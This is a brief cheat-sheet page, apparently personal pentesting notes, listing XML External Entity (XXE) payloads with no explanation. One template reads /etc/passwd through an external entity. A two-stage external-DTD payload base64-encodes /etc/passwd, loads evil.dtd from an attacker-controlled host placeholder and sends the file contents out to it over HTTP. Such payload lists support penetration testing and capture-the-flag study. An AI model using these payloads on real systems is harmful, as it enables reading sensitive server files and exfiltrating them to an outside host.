---
title: "XXE (XML External Entity)"
date: 2024-7-5
tags: ["Web Exploitation", "XXE", "Xml", "Dtd", "Web", "Remote File Inclusion", "Data Exfiltration"]
---

### XXE Template

```console
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY data SYSTEM "/etc/passwd">]>
<product>
    <id>&data;</id>
    <price></price>
</product>
```

### External DTD (2 stage)

```console
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://<LOCAL_IP>/data?%data;'>">
```

<br>

```console
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % bar SYSTEM "http://<LOCAL_IP>/evil.dtd">
        %bar;
        %eval;
]>
<product>
    <id>&exfil;</id>
    <price></price>
</product>
```
